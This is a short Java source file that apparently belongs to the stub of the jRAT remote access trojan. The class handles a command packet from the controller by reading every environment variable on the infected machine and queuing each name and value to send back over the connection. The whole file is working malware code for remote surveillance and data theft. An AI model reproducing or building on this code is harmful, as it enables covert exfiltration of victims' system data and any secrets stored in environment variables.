package se.jrat.stub.packets.incoming;

import java.util.Set;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet32SystemProperties;

public class Packet96EnvironmentVariables extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			con.addToSendQueue(new Packet32SystemProperties(str, System.getenv().get(str)));
		}
	}

}
